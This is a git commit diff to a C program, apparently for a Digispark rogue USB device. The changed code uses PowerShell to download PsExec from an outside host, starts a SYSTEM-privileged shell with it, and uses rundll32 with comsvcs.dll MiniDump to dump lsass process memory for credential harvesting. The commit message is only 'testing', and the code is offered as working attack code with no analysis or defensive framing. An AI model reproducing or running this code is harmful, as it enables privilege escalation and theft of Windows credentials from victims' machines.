d83a0255055daa8dd9985be9cb892ff2daa8e769
jacobh4535 <jacob.holtz20@gmail.com>
2021-12-22 09:46:09 -0600

    testing

--- digispark_exe.c
+++ digispark_exe.c
@@ -3,7 +3,10 @@
 #include <string.h>
 
 int main(int c, char *argv[]){
-	printf("exe executed, dumping lsass.dmp to desktop\n");
+	printf("exe executed, downloading psexec.exe\n");
+	system("powershell -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','$HOME\\p.exe')) }\"")
+	//run powershell with system privs
+	system("powershell -C \"$HOME\\p.exe -i -s powershell \"")
 	//system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','C:\\Windows\\Temp\\pe.exe')) } \"");
 	system("C:/Windows/system32/rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Jacob\\Desktop\\lsass.dmp full");
 
